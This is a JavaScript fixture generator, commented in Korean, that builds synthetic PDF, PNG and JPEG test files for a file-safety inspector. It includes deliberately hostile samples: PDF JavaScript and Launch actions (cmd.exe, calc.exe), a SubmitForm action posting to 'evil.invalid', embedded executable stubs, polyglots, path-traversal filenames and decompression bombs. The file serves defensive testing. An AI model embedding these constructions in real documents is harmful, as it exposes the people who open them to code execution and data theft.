// ============================================================
// B-FILE-SAFETY 합성 Fixture 생성기. 실제 문서·개인정보를 쓰지 않고 바이트를 결정적으로 만든다.
// 생성기는 evidence scope 에 들어가며, 정책은 결과의 fixture SHA-256 을 이 생성기의 출력과 대조한다.
// 분류(category)별 기대 판정과 사유 가족은 CATEGORY_RULES 에 고정한다.
// ============================================================
import { createHash } from "node:crypto";

// zlib 의 deflate 출력은 구현·버전마다 다르다. run 34025763646 을 채택하려다
// Fixture 5건의 SHA-256 이 로컬과 실행 환경에서 갈리는 것을 확인했다.
// 압축기 heuristic 을 쓰지 않고 규격이 값을 완전히 정하는 두 가지만 쓴다.
//   storedZlib: 저장 블록만 쓴다. 압축은 되지 않지만 바이트가 완전히 결정된다.
//   zerosZlib : 0 바이트 반복을 고정 Huffman 의 길이·거리 부호로 적는다. 압축비가 크다.
const adler32 = (bytes) => {
  let a = 1;
  let b = 0;
  for (let i = 0; i < bytes.length; i += 1) { a = (a + bytes[i]) % 65521; b = (b + a) % 65521; }
  return ((b * 65536) + a) >>> 0;
};
const zlibWrap = (deflated, adler) => {
  const tail = Buffer.alloc(4);
  tail.writeUInt32BE(adler >>> 0);
  return Buffer.concat([Buffer.from([0x78, 0x01]), deflated, tail]);
};
export const storedZlib = (input) => {
  const parts = [];
  const MAX = 65535;
  for (let offset = 0; offset < input.length || offset === 0; offset += MAX) {
    const part = input.subarray(offset, Math.min(offset + MAX, input.length));
    const head = Buffer.alloc(5);
    head[0] = offset + MAX >= input.length ? 1 : 0;
    head.writeUInt16LE(part.length, 1);
    head.writeUInt16LE(~part.length & 0xffff, 3);
    parts.push(head, Buffer.from(part));
    if (input.length === 0) break;
  }
  return zlibWrap(Buffer.concat(parts), adler32(input));
};
// 고정 Huffman 한 블록. 0 리터럴 하나를 적고 길이 258·거리 1 반복으로 늘린다.
// 258 로 나눠떨어지지 않는 나머지는 리터럴로 채운다. 어떤 길이든 결정적으로 나온다.
export const zerosZlib = (length) => {
  if (!Number.isInteger(length) || length < 1) throw new Error("zerosZlib 길이는 1 이상 정수여야 한다");
  const bits = [];
  const pushBits = (value, count) => { for (let i = 0; i < count; i += 1) bits.push((value >> i) & 1); };
  const pushCode = (value, count) => { for (let i = count - 1; i >= 0; i -= 1) bits.push((value >> i) & 1); };
  const repeats = Math.floor((length - 1) / 258);
  const literals = length - (repeats * 258);
  pushBits(1, 1); // BFINAL
  pushBits(1, 2); // BTYPE = 고정 Huffman
  for (let i = 0; i < literals; i += 1) pushCode(0x30, 8); // literal 0x00
  for (let i = 0; i < repeats; i += 1) {
    pushCode(0xc5, 8); // length code 285 = 258
    pushCode(0, 5);    // distance code 0 = 1
  }
  pushCode(0, 7); // end of block
  const bytes = Buffer.alloc(Math.ceil(bits.length / 8));
  bits.forEach((bit, index) => { if (bit) bytes[index >> 3] |= 1 << (index & 7); });
  return zlibWrap(bytes, adler32(Buffer.alloc(length)));
};
import { LIMITS, crc32 } from "./file-safety-inspector.mjs";

export const FIXTURE_GENERATOR_VERSION = "file-safety-fixtures-v1";
export const BENIGN_TEXT = "APR 15.9% NOT guaranteed 1397";

// fault 주입마다 기대하는 종료 형태. terminated 는 비정상 종료(코드 0 아님 또는 신호),
// wall_timeout 은 부모의 시간 상한이 끝냈는지, parsable 은 stdout 이 JSON 인지다.
// 어느 fault 도 파일 판정값을 만들어서는 안 된다.
//
// oom 은 wall_timeout 이 false 여야 한다. run 34025455027 에서 Buffer 로 채운 heap 은
// --max-old-space-size 에 걸리지 않아 시간 상한으로 끝났고, 그것은 hang 과 같은 시험이었다.
export const FAULT_EXPECTATIONS = Object.freeze({
  crash: Object.freeze({ terminated: true, wall_timeout: false, parsable: false }),
  hang: Object.freeze({ terminated: true, wall_timeout: true, parsable: false }),
  oom: Object.freeze({ terminated: true, wall_timeout: false, parsable: false }),
  "exit-nonzero": Object.freeze({ terminated: true, wall_timeout: false, parsable: false }),
  garbage: Object.freeze({ terminated: false, wall_timeout: false, parsable: false }),
  "network-canary": Object.freeze({ terminated: false, wall_timeout: false, parsable: true }),
});
export const FAULT_WALL_MS = 5_000;

// category → 기대 판정, 허용되는 사유 코드 가족, 최소 건수
export const CATEGORY_RULES = Object.freeze({
  benign: Object.freeze({ expected: "ACCEPT", reasons: Object.freeze([]), minimum: 8 }),
  encrypted: Object.freeze({ expected: "REJECT", reasons: Object.freeze(["encrypted"]), minimum: 3 }),
  active: Object.freeze({ expected: "REJECT", reasons: Object.freeze(["active-content", "open-action"]), minimum: 8 }),
  embedded: Object.freeze({ expected: "REJECT", reasons: Object.freeze(["embedded-file", "executable-payload"]), minimum: 3 }),
  polyglot: Object.freeze({ expected: "REJECT", reasons: Object.freeze(["type-mismatch", "foreign-signature", "zip-appended", "trailing-data", "polyglot-html", "double-extension", "unsafe-filename", "unknown-type", "extension-mismatch"]), minimum: 10 }),
  bomb: Object.freeze({ expected: "REJECT", reasons: Object.freeze(["too-large", "page-limit", "pixel-limit", "decompression-bomb", "object-limit", "nesting-limit"]), minimum: 8 }),
  malformed: Object.freeze({ expected: "REJECT", reasons: Object.freeze(["empty", "malformed", "malformed-xref", "no-pages", "malformed-png", "malformed-jpeg", "unknown-type", "parser-malformed"]), minimum: 8 }),
  fault: Object.freeze({ expected: "FAULT", reasons: Object.freeze([]), minimum: 5 }),
});

const latin1 = (text) => Buffer.from(text, "latin1");
const sha256 = (bytes) => createHash("sha256").update(bytes).digest("hex");

// objects[i] 는 객체 (i+1) 0 obj 의 본문이다. Buffer 또는 latin1 문자열.
export const buildPdf = ({ objects, root = 1, trailerExtra = "", version = "1.4", omitEof = false, badStartxref = false, trailing = null, header = null }) => {
  const parts = [latin1(header ?? `%PDF-${version}\n%\xE2\xE3\xCF\xD3\n`)];
  let length = parts[0].length;
  const offsets = [];
  objects.forEach((body, index) => {
    const head = latin1(`${index + 1} 0 obj\n`);
    const bodyBytes = Buffer.isBuffer(body) ? body : latin1(body);
    const tail = latin1("\nendobj\n");
    offsets.push(length);
    parts.push(head, bodyBytes, tail);
    length += head.length + bodyBytes.length + tail.length;
  });
  const xrefOffset = length;
  let xref = `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  for (const offset of offsets) xref += `${String(offset).padStart(10, "0")} 00000 n \n`;
  xref += `trailer\n<< /Size ${objects.length + 1} /Root ${root} 0 R${trailerExtra} >>\nstartxref\n${badStartxref ? 999999999 : xrefOffset}\n`;
  if (!omitEof) xref += "%%EOF\n";
  parts.push(latin1(xref));
  if (trailing) parts.push(Buffer.isBuffer(trailing) ? trailing : latin1(trailing));
  return Buffer.concat(parts);
};

const streamObject = (dict, data, { filter = null } = {}) => {
  const bytes = Buffer.isBuffer(data) ? data : latin1(data);
  const filterText = filter ? ` /Filter ${filter}` : "";
  return Buffer.concat([latin1(`<< ${dict} /Length ${bytes.length}${filterText} >>\nstream\n`), bytes, latin1("\nendstream")]);
};
const contentStream = (text) => `BT /F1 14 Tf 20 60 Td (${text}) Tj ET`;

// 기본 문서: 1 catalog, 2 pages, 3 font, 이후 페이지마다 page·content 객체
export const simplePdf = ({ pages = 1, text = BENIGN_TEXT, catalogExtra = "", pageExtra = "", extraObjects = [], flate = false, pagesCountOverride = null, kidsOverride = null, trailerExtra = "", header = null, omitEof = false, badStartxref = false, trailing = null, version = "1.4" } = {}) => {
  const objects = [];
  const pageNumbers = [];
  for (let i = 0; i < pages; i += 1) pageNumbers.push(4 + i * 2);
  objects.push(`<< /Type /Catalog /Pages 2 0 R${catalogExtra} >>`);
  objects.push(`<< /Type /Pages /Kids [${(kidsOverride ?? pageNumbers).map((n) => `${n} 0 R`).join(" ")}] /Count ${pagesCountOverride ?? pages} >>`);
  objects.push("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>");
  for (let i = 0; i < pages; i += 1) {
    const contentNumber = 5 + i * 2;
    objects.push(`<< /Type /Page /Parent 2 0 R /MediaBox [0 0 320 120] /Resources << /Font << /F1 3 0 R >> >> /Contents ${contentNumber} 0 R${pageExtra} >>`);
    const content = contentStream(`${text} p${i + 1}`);
    objects.push(flate ? streamObject("", storedZlib(latin1(content)), { filter: "/FlateDecode" }) : streamObject("", content));
  }
  for (const extra of extraObjects) objects.push(extra);
  return buildPdf({ objects, trailerExtra, header, omitEof, badStartxref, trailing, version });
};
const nextObjectNumber = (pages) => 4 + pages * 2; // extraObjects[0] 의 번호

// PNG: 필터 0 행, RGB 8bit
export const buildPng = ({ width, height, ihdrOverride = null, corruptCrc = false, truncateAt = null, trailing = null, omitIend = false }) => {
  const chunk = (type, data, corrupt = false) => {
    const typeData = Buffer.concat([latin1(type), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE((crc32(typeData) ^ (corrupt ? 0xffffffff : 0)) >>> 0);
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    return Buffer.concat([len, typeData, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(ihdrOverride?.width ?? width, 0);
  ihdr.writeUInt32BE(ihdrOverride?.height ?? height, 4);
  ihdr[8] = 8; ihdr[9] = 2; ihdr[10] = 0; ihdr[11] = 0; ihdr[12] = 0;
  // 모든 행의 필터 바이트와 화소를 0 으로 둔다. 검사 대상은 구조와 크기이지 그림이 아니다.
  const rawLength = (1 + width * 3) * height;
  const idat = zerosZlib(rawLength);
  const parts = [Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk("IHDR", ihdr, corruptCrc), chunk("IDAT", idat)];
  if (!omitIend) parts.push(chunk("IEND", Buffer.alloc(0)));
  if (trailing) parts.push(trailing);
  let out = Buffer.concat(parts);
  if (truncateAt !== null) out = out.subarray(0, truncateAt);
  return out;
};

// JPEG: 구조만 유효한 baseline 헤더 (SOI, APP0, DQT, SOF0, DHT, SOS, 엔트로피 데이터, EOI)
export const buildJpeg = ({ width, height, omitSof = false, omitEoi = false, trailing = null, sofMarker = 0xc0 }) => {
  const seg = (marker, payload) => {
    const len = Buffer.alloc(2);
    len.writeUInt16BE(payload.length + 2);
    return Buffer.concat([Buffer.from([0xff, marker]), len, payload]);
  };
  const app0 = seg(0xe0, Buffer.concat([latin1("JFIF\0"), Buffer.from([1, 1, 0, 0, 72, 0, 72, 0, 0])]));
  const dqt = seg(0xdb, Buffer.concat([Buffer.from([0]), Buffer.alloc(64, 16)]));
  const sofPayload = Buffer.alloc(9);
  sofPayload[0] = 8; sofPayload.writeUInt16BE(height, 1); sofPayload.writeUInt16BE(width, 3); sofPayload[5] = 1; sofPayload[6] = 1; sofPayload[7] = 0x11; sofPayload[8] = 0;
  const sof = seg(sofMarker, sofPayload);
  const dht = seg(0xc4, Buffer.concat([Buffer.from([0x00]), Buffer.from([1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]), Buffer.from([0x00])]));
  const sos = seg(0xda, Buffer.from([1, 1, 0x00, 0, 63, 0]));
  const entropy = Buffer.alloc(64, 0x55);
  const parts = [Buffer.from([0xff, 0xd8]), app0, dqt];
  if (!omitSof) parts.push(sof);
  parts.push(dht, sos, entropy);
  if (!omitEoi) parts.push(Buffer.from([0xff, 0xd9]));
  if (trailing) parts.push(trailing);
  return Buffer.concat(parts);
};

// 최소 ZIP: local header + central directory + EOCD
export const buildZip = (name = "payload.txt", content = "zip payload") => {
  const data = latin1(content);
  const nameBytes = latin1(name);
  const local = Buffer.alloc(30);
  local.write("PK\x03\x04", 0, "latin1"); local.writeUInt16LE(20, 4); local.writeUInt32LE(crc32(data), 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22); local.writeUInt16LE(nameBytes.length, 26);
  const central = Buffer.alloc(46);
  central.write("PK\x01\x02", 0, "latin1"); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6); central.writeUInt32LE(crc32(data), 16); central.writeUInt32LE(data.length, 20); central.writeUInt32LE(data.length, 24); central.writeUInt16LE(nameBytes.length, 28);
  const localSize = 30 + nameBytes.length + data.length;
  const eocd = Buffer.alloc(22);
  eocd.write("PK\x05\x06", 0, "latin1"); eocd.writeUInt16LE(1, 8); eocd.writeUInt16LE(1, 10); eocd.writeUInt32LE(46 + nameBytes.length, 12); eocd.writeUInt32LE(localSize, 16);
  return Buffer.concat([local, nameBytes, data, central, nameBytes, eocd]);
};

const peBytes = () => { const b = Buffer.alloc(512); b.write("MZ", 0, "latin1"); b.writeUInt32LE(0x80, 0x3c); b.write("PE\0\0", 0x80, "latin1"); b.writeUInt16LE(0x14c, 0x84); b.write("This program cannot be run in DOS mode.", 0x4e, "latin1"); return b; };
const elfBytes = () => { const b = Buffer.alloc(256); b.write("\x7fELF", 0, "latin1"); b[4] = 2; b[5] = 1; b[6] = 1; b.writeUInt16LE(2, 16); b.writeUInt16LE(0x3e, 18); return b; };
const machoBytes = () => { const b = Buffer.alloc(256); b.writeUInt32BE(0xcffaedfe, 0); b.writeUInt32LE(0x01000007, 4); return b; };

const jsAction = "<< /S /JavaScript /JS (app.alert\\(1\\)) >>";

const encryptDict = (variant) => {
  const zeros32 = "<" + "00".repeat(32) + ">";
  if (variant === "rc4") return `<< /Filter /Standard /V 1 /R 2 /Length 40 /P -1 /O ${zeros32} /U ${zeros32} >>`;
  if (variant === "aes") return `<< /Filter /Standard /V 4 /R 4 /Length 128 /P -1 /CF << /StdCF << /CFM /AESV2 /AuthEvent /DocOpen /Length 16 >> >> /StmF /StdCF /StrF /StdCF /O ${zeros32} /U ${zeros32} >>`;
  return "<< /Filter /Adobe.PubSec /SubFilter /adbe.pkcs7.s5 /V 4 /R 4 /Length 128 /Recipients [<00>] >>";
};

const fixture = (name, category, bytes, { filename = null, declaredMime = "application/pdf", fault = null, stage = "inspector", wallMs = null } = {}) => ({
  name, category, filename: filename ?? `${name}.${declaredMime === "application/pdf" ? "pdf" : declaredMime === "image/png" ? "png" : "jpg"}`,
  declared_mime: declaredMime, bytes, sha256: sha256(bytes), expected: CATEGORY_RULES[category].expected, expected_stage: stage, fault, wall_ms: wallMs,
});

export const buildFixtures = () => {
  const list = [];
  const benignPdf = simplePdf();
  const zeros40Length = 40 * 1024 * 1024;

  // ---------- benign ----------
  list.push(fixture("benign-pdf-1page", "benign", benignPdf));
  list.push(fixture("benign-pdf-3pages", "benign", simplePdf({ pages: 3 })));
  list.push(fixture("benign-pdf-10pages", "benign", simplePdf({ pages: LIMITS.MAX_PAGES })));
  list.push(fixture("benign-pdf-flate-content", "benign", simplePdf({ flate: true })));
  {
    const n = nextObjectNumber(1);
    const image = streamObject("/Type /XObject /Subtype /Image /Width 64 /Height 64 /ColorSpace /DeviceRGB /BitsPerComponent 8", storedZlib(Buffer.alloc(64 * 64 * 3)), { filter: "/FlateDecode" });
    list.push(fixture("benign-pdf-small-image", "benign", simplePdf({ extraObjects: [image], pageExtra: ` /Resources << /Font << /F1 3 0 R >> /XObject << /Im1 ${n} 0 R >> >>` })));
  }
  list.push(fixture("benign-pdf-openaction-goto-array", "benign", simplePdf({ catalogExtra: " /OpenAction [4 0 R /Fit]" })));
  {
    const n = nextObjectNumber(1);
    list.push(fixture("benign-pdf-openaction-goto-dict", "benign", simplePdf({ catalogExtra: ` /OpenAction ${n} 0 R`, extraObjects: ["<< /S /GoTo /D [4 0 R /Fit] >>"] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("benign-pdf-uri-link", "benign", simplePdf({ pageExtra: ` /Annots [${n} 0 R]`, extraObjects: ["<< /Type /Annot /Subtype /Link /Rect [20 20 100 40] /A << /S /URI /URI (https://www.kinfa.or.kr/financialProduct/hessalLoan.do) >> >>"] })));
  }
  list.push(fixture("benign-pdf-version-1.7", "benign", simplePdf({ version: "1.7" })));
  list.push(fixture("benign-pdf-trailing-under-limit", "benign", simplePdf({ trailing: "%".repeat(LIMITS.MAX_TRAILING_BYTES - 24) })));
  {
    // 정확히 10 MiB: 비압축 padding stream 의 길이를 두 번 계산해 맞춘다
    const build = (padLength) => simplePdf({ extraObjects: [streamObject("", Buffer.alloc(padLength, 0x20))] });
    const base = build(0).length;
    let pad = LIMITS.MAX_BYTES - base;
    let bytes = build(pad);
    pad += LIMITS.MAX_BYTES - bytes.length;
    bytes = build(pad);
    list.push(fixture("benign-pdf-exact-10mib", "benign", bytes));
  }
  list.push(fixture("benign-png-100x100", "benign", buildPng({ width: 100, height: 100 }), { declaredMime: "image/png" }));
  list.push(fixture("benign-png-3000x3000", "benign", buildPng({ width: 3000, height: 3000 }), { declaredMime: "image/png" }));
  list.push(fixture("benign-jpeg-640x480", "benign", buildJpeg({ width: 640, height: 480 }), { declaredMime: "image/jpeg" }));
  list.push(fixture("benign-jpeg-progressive-1920x1080", "benign", buildJpeg({ width: 1920, height: 1080, sofMarker: 0xc2 }), { declaredMime: "image/jpeg", filename: "benign-jpeg-progressive-1920x1080.jpeg" }));

  // ---------- encrypted ----------
  for (const variant of ["rc4", "aes", "pubsec"]) {
    const n = nextObjectNumber(1);
    list.push(fixture(`encrypted-${variant}`, "encrypted", simplePdf({ extraObjects: [encryptDict(variant)], trailerExtra: ` /Encrypt ${n} 0 R /ID [<01> <01>]` })));
  }
  {
    // /Encrypt 가 trailer 가 아니라 xref stream 사전에만 있는 경우
    const n = nextObjectNumber(1);
    const xrefStream = streamObject(`/Type /XRef /Size ${n + 2} /W [1 2 1] /Root 1 0 R /Encrypt ${n} 0 R`, Buffer.alloc(8));
    list.push(fixture("encrypted-xref-stream-dict", "encrypted", simplePdf({ extraObjects: [encryptDict("rc4"), xrefStream] })));
  }

  // ---------- active content ----------
  list.push(fixture("active-openaction-javascript", "active", simplePdf({ catalogExtra: ` /OpenAction ${jsAction}` })));
  {
    const n = nextObjectNumber(1);
    list.push(fixture("active-openaction-indirect-javascript", "active", simplePdf({ catalogExtra: ` /OpenAction ${n} 0 R`, extraObjects: [jsAction] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("active-names-javascript-tree", "active", simplePdf({ catalogExtra: ` /Names << /JavaScript << /Names [(init) ${n} 0 R] >> >>`, extraObjects: [jsAction] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("active-page-additional-action", "active", simplePdf({ pageExtra: ` /AA << /O ${n} 0 R >>`, extraObjects: [jsAction] })));
  }
  list.push(fixture("active-launch", "active", simplePdf({ catalogExtra: " /OpenAction << /S /Launch /F (cmd.exe) >>" })));
  {
    const n = nextObjectNumber(1);
    list.push(fixture("active-submitform", "active", simplePdf({ pageExtra: ` /Annots [${n} 0 R]`, extraObjects: ["<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /SubmitForm /F (https://evil.invalid/collect) /Flags 4 >> >>"] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("active-importdata", "active", simplePdf({ pageExtra: ` /Annots [${n} 0 R]`, extraObjects: ["<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /ImportData /F (data.fdf) >> >>"] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("active-richmedia", "active", simplePdf({ pageExtra: ` /Annots [${n} 0 R]`, extraObjects: ["<< /Type /Annot /Subtype /RichMedia /Rect [0 0 10 10] >>"] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("active-xfa", "active", simplePdf({ catalogExtra: ` /AcroForm << /Fields [] /XFA ${n} 0 R >>`, extraObjects: [streamObject("", "<xdp:xdp xmlns:xdp=\"http://ns.adobe.com/xdp/\"><script>x</script></xdp:xdp>")] })));
  }
  list.push(fixture("active-name-escaped-javascript", "active", simplePdf({ catalogExtra: " /OpenAction << /S /J#61vaScript /J#53 (app.alert\\(1\\)) >>" })));
  {
    // 객체 stream 안에 숨긴 JavaScript
    const n = nextObjectNumber(1);
    const inner = `${n + 1} 0 ${jsAction}`;
    const headerText = `${n + 1} 0 `;
    const body = latin1(`${headerText}${jsAction}`);
    const objStm = streamObject(`/Type /ObjStm /N 1 /First ${headerText.length}`, storedZlib(latin1(`${headerText}${jsAction}`)), { filter: "/FlateDecode" });
    void inner; void body;
    list.push(fixture("active-javascript-in-object-stream", "active", simplePdf({ extraObjects: [objStm] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("active-gotor-remote", "active", simplePdf({ pageExtra: ` /Annots [${n} 0 R]`, extraObjects: ["<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /GoToR /F (other.pdf) /D [0 /Fit] >> >>"] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("active-movie-annotation", "active", simplePdf({ pageExtra: ` /Annots [${n} 0 R]`, extraObjects: ["<< /Type /Annot /Subtype /Movie /Rect [0 0 10 10] /Movie << /F (clip.avi) >> >>"] })));
  }
  {
    const nested = storedZlib(storedZlib(latin1(`<< /S /JavaScript /JS (app.alert\\(2\\)) >>`)));
    list.push(fixture("active-javascript-nested-flate", "active", simplePdf({ extraObjects: [streamObject("", nested, { filter: "[/FlateDecode /FlateDecode]" })] })));
  }
  list.push(fixture("active-openaction-mixed-actions", "active", simplePdf({ catalogExtra: " /OpenAction << /S /GoTo /D [4 0 R /Fit] /Next << /S /Launch /F (calc.exe) >> >>" })));

  // ---------- embedded files ----------
  {
    const n = nextObjectNumber(1);
    list.push(fixture("embedded-file-name-tree", "embedded", simplePdf({ catalogExtra: ` /Names << /EmbeddedFiles << /Names [(a.txt) ${n} 0 R] >> >>`, extraObjects: [`<< /Type /Filespec /F (a.txt) /EF << /F ${n + 1} 0 R >> >>`, streamObject("/Type /EmbeddedFile", "hello")] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("embedded-fileattachment-annotation", "embedded", simplePdf({ pageExtra: ` /Annots [${n} 0 R]`, extraObjects: [`<< /Type /Annot /Subtype /FileAttachment /Rect [0 0 10 10] /FS ${n + 1} 0 R >>`, `<< /Type /Filespec /F (b.txt) /EF << /F ${n + 2} 0 R >> >>`, streamObject("/Type /EmbeddedFile", "world")] })));
  }
  {
    const n = nextObjectNumber(1);
    list.push(fixture("embedded-executable-payload", "embedded", simplePdf({ catalogExtra: ` /Names << /EmbeddedFiles << /Names [(setup.exe) ${n} 0 R] >> >>`, extraObjects: [`<< /Type /Filespec /F (setup.exe) /EF << /F ${n + 1} 0 R >> >>`, streamObject("/Type /EmbeddedFile", storedZlib(peBytes()), { filter: "/FlateDecode" })] })));
  }
  list.push(fixture("embedded-filespec-only", "embedded", simplePdf({ extraObjects: ["<< /Type /Filespec /F (c.bin) /EF << /F 3 0 R >> >>"] })));
  list.push(fixture("embedded-raw-executable-stream", "embedded", simplePdf({ extraObjects: [streamObject("", peBytes())] })));

  // ---------- polyglot / type confusion ----------
  list.push(fixture("polyglot-pdf-zip-appended", "polyglot", Buffer.concat([benignPdf, buildZip()])));
  list.push(fixture("polyglot-zip-then-pdf", "polyglot", Buffer.concat([buildZip("x.txt", "prefix"), benignPdf])));
  list.push(fixture("polyglot-pdf-html-comment", "polyglot", simplePdf({ header: "%PDF-1.4\n%<html><script>alert(1)</script></html>\n" })));
  list.push(fixture("polyglot-png-pdf-appended", "polyglot", buildPng({ width: 10, height: 10, trailing: benignPdf }), { declaredMime: "image/png" }));
  list.push(fixture("polyglot-jpeg-zip-appended", "polyglot", buildJpeg({ width: 8, height: 8, trailing: buildZip() }), { declaredMime: "image/jpeg" }));
  list.push(fixture("polyglot-gifar", "polyglot", Buffer.concat([latin1("GIF89a"), Buffer.alloc(20), buildZip("a.class", "cafe")]), { declaredMime: "image/png" }));
  list.push(fixture("mismatch-pdf-declared-png", "polyglot", benignPdf, { declaredMime: "image/png" }));
  list.push(fixture("mismatch-png-declared-pdf", "polyglot", buildPng({ width: 10, height: 10 }), { declaredMime: "application/pdf" }));
  list.push(fixture("mismatch-png-bytes-jpg-name", "polyglot", buildPng({ width: 10, height: 10 }), { declaredMime: "image/png", filename: "mismatch-png-bytes-jpg-name.jpg" }));
  list.push(fixture("double-extension-pdf-exe", "polyglot", benignPdf, { filename: "report.pdf.exe" }));
  list.push(fixture("double-extension-exe-pdf", "polyglot", benignPdf, { filename: "invoice.exe.pdf" }));
  list.push(fixture("double-extension-html-png", "polyglot", buildPng({ width: 10, height: 10 }), { declaredMime: "image/png", filename: "photo.html.png" }));
  list.push(fixture("renamed-pe-executable", "polyglot", peBytes()));
  list.push(fixture("renamed-elf", "polyglot", elfBytes(), { declaredMime: "image/png" }));
  list.push(fixture("renamed-macho", "polyglot", machoBytes(), { declaredMime: "image/jpeg" }));
  list.push(fixture("renamed-shell-script", "polyglot", latin1("#!/bin/sh\necho pwned\n")));
  list.push(fixture("svg-script-declared-png", "polyglot", latin1("<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"), { declaredMime: "image/png" }));
  list.push(fixture("html-declared-pdf", "polyglot", latin1("<!DOCTYPE html><html><body>%PDF-1.4</body></html>")));
  list.push(fixture("unsafe-filename-traversal", "polyglot", benignPdf, { filename: "../../etc/passwd.pdf" }));
  list.push(fixture("unsafe-filename-nul", "polyglot", benignPdf, { filename: "a.pdf\0.exe" }));
  list.push(fixture("unsafe-filename-dotfile", "polyglot", benignPdf, { filename: ".htaccess.pdf" }));
  list.push(fixture("pdf-trailing-junk-2kib", "polyglot", simplePdf({ trailing: Buffer.alloc(2048, 0x41) })));
  list.push(fixture("pdf-header-offset", "polyglot", Buffer.concat([Buffer.alloc(300, 0x0a), benignPdf])));
  list.push(fixture("png-trailing-data", "polyglot", buildPng({ width: 10, height: 10, trailing: Buffer.alloc(100, 0x00) }), { declaredMime: "image/png" }));
  list.push(fixture("jpeg-trailing-data", "polyglot", buildJpeg({ width: 8, height: 8, trailing: Buffer.alloc(100, 0x00) }), { declaredMime: "image/jpeg" }));
  list.push(fixture("ole-document-declared-pdf", "polyglot", Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(504)])));

  // ---------- bomb / resource limits ----------
  list.push(fixture("bomb-pdf-11pages", "bomb", simplePdf({ pages: LIMITS.MAX_PAGES + 1 })));
  list.push(fixture("bomb-pdf-200pages", "bomb", simplePdf({ pages: 200 })));
  list.push(fixture("bomb-pdf-page-count-lie", "bomb", simplePdf({ pagesCountOverride: 100000 })));
  {
    const n = nextObjectNumber(1);
    const image = streamObject("/Type /XObject /Subtype /Image /Width 20000 /Height 20000 /ColorSpace /DeviceRGB /BitsPerComponent 8", storedZlib(Buffer.alloc(64)), { filter: "/FlateDecode" });
    list.push(fixture("bomb-pdf-image-20000x20000", "bomb", simplePdf({ extraObjects: [image], pageExtra: ` /Resources << /Font << /F1 3 0 R >> /XObject << /Im1 ${n} 0 R >> >>` })));
  }
  {
    const n = nextObjectNumber(1);
    const images = Array.from({ length: 8 }, () => streamObject("/Type /XObject /Subtype /Image /Width 4500 /Height 4500 /ColorSpace /DeviceRGB /BitsPerComponent 8", storedZlib(Buffer.alloc(64)), { filter: "/FlateDecode" }));
    const xobjects = images.map((_, i) => `/Im${i} ${n + i} 0 R`).join(" ");
    list.push(fixture("bomb-pdf-total-image-pixels", "bomb", simplePdf({ extraObjects: images, pageExtra: ` /Resources << /Font << /F1 3 0 R >> /XObject << ${xobjects} >> >>` })));
  }
  list.push(fixture("bomb-pdf-flate-40mib", "bomb", simplePdf({ extraObjects: [streamObject("", zerosZlib(zeros40Length), { filter: "/FlateDecode" })] })));
  list.push(fixture("bomb-pdf-nested-flate", "bomb", simplePdf({ extraObjects: [streamObject("", storedZlib(zerosZlib(zeros40Length)), { filter: "[/FlateDecode /FlateDecode]" })] })));
  {
    const oneMib = zerosZlib(1024 * 1024);
    list.push(fixture("bomb-pdf-many-streams-200mib", "bomb", simplePdf({ extraObjects: Array.from({ length: 200 }, () => streamObject("", oneMib, { filter: "/FlateDecode" })) })));
  }
  list.push(fixture("bomb-pdf-object-count", "bomb", simplePdf({ extraObjects: Array.from({ length: LIMITS.MAX_OBJECTS + 10 }, () => "<< >>") })));
  list.push(fixture("bomb-pdf-nesting-depth", "bomb", simplePdf({ extraObjects: [`${"[".repeat(LIMITS.MAX_NESTING * 4)}${"]".repeat(LIMITS.MAX_NESTING * 4)}`] })));
  list.push(fixture("bomb-pdf-over-10mib", "bomb", simplePdf({ extraObjects: [streamObject("", Buffer.alloc(LIMITS.MAX_BYTES, 0x20))] })));
  list.push(fixture("bomb-png-30000x30000-header", "bomb", buildPng({ width: 4, height: 4, ihdrOverride: { width: 30000, height: 30000 } }), { declaredMime: "image/png" }));
  list.push(fixture("bomb-png-max-dimensions", "bomb", buildPng({ width: 4, height: 4, ihdrOverride: { width: 0x7fffffff, height: 0x7fffffff } }), { declaredMime: "image/png" }));
  list.push(fixture("bomb-jpeg-sof-30000x30000", "bomb", buildJpeg({ width: 30000, height: 30000 }), { declaredMime: "image/jpeg" }));

  // ---------- malformed ----------
  list.push(fixture("malformed-empty", "malformed", Buffer.alloc(0)));
  list.push(fixture("malformed-one-byte", "malformed", Buffer.from([0x25])));
  list.push(fixture("malformed-header-only", "malformed", latin1("%PDF-1.4\n")));
  list.push(fixture("malformed-truncated-mid-object", "malformed", benignPdf.subarray(0, Math.floor(benignPdf.length * 0.6))));
  list.push(fixture("malformed-missing-eof", "malformed", simplePdf({ omitEof: true })));
  list.push(fixture("malformed-bad-startxref", "malformed", simplePdf({ badStartxref: true })));
  list.push(fixture("malformed-no-pages-object", "malformed", buildPdf({ objects: ["<< /Type /Catalog >>"] })));
  list.push(fixture("malformed-negative-page-count", "malformed", simplePdf({ pagesCountOverride: -1 })));
  list.push(fixture("malformed-pdf-version-9", "malformed", simplePdf({ version: "9.9" })));
